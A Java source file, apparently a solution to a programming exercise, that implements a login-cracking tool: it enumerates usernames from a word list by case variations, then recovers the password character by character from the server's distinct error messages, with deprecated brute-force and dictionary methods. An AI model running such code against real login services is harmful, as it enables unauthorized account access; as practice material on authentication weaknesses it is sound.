package hacker;

import com.google.gson.Gson;
import model.AuthRequest;

import java.io.IOException;
import java.util.*;

public class PassHacker {
    RequestManager requestManager;
    private static final char[] allChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
    private final List<String> passList;
    private final List<String> loginList;

    public PassHacker(RequestManager requestManager) {
        this.requestManager = requestManager;
        this.passList = FileManager.getPassList();
        this.loginList = FileManager.getLoginList();
    }

    public void start() {
        String login = findLogin();
        System.out.println();
        if (login == null) {
            System.out.println("Failed to find login");
            return;
        }
        String password = findPassword(login, "");
        System.out.println();
        if (password == null) {
            System.out.println("Failed to find password");
            return;
        }
        System.out.println("Credits found: " + new Gson().toJson(new AuthRequest(login, password)));
    }

    @Deprecated
    public void simpleBruteForce() throws IOException {
        Queue<String> queue = new LinkedList<>();
        queue.add("");

        while (!queue.isEmpty()) {
            String current = queue.poll();

            for (char c : allChars) {
                String pass = current + c;
                if (checkPass(pass)) return;
                queue.add(pass);
            }
        }
    }

    @Deprecated
    public void dictionaryBasedBruteForce() throws IOException {
        for (String pass : passList) {
            for (String combination : generateAllCombinations(pass)) {
                if (checkPass(combination)) return;
            }
        }
    }

    private boolean checkPass(String pass) throws IOException {
        String msgIn = requestManager.sendSimpleRequest(pass);

        if (msgIn.equals("Too many attempts")) throw new IOException("Server is closed!");
        return msgIn.equals("Connection success!");
    }

    public List<String> generateAllCombinations(String pass) {
        List<String> result = new ArrayList<>();
        result.add("");

        for (char c : pass.toCharArray()) {
            List<String> newList = new ArrayList<>();
            for (String s : result) {
                newList.add(s + Character.toLowerCase(c));
                if (Character.isLetter(c)) {
                    newList.add(s + Character.toUpperCase(c));
                }
            }
            result = newList;
        }

        return result;
    }

    private String findLogin() {
        for (String rootLogin : loginList) {
            for (String login : generateAllCombinations(rootLogin)) {
                String result = requestManager.sendRequest(login, "123");
                System.out.print("\033[2K\rChecking login :" + login + ". Result: " + result);
                if (Objects.equals(result, "Wrong password!")) return login;
            }
        }
        return null;
    }

    private String findPassword(String login, String pass) {
        for (char c : allChars) {
            String result = requestManager.sendRequest(login, pass + c);
            System.out.print("\033[2K\rChecking pass :" + (pass + c) + ". Result: " + result);
            if (Objects.equals(result, "Exception happened during login")) return findPassword(login, pass + c);
            if (Objects.equals(result, "Connection success!")) return pass + c;
        }
        return null;
    }
}

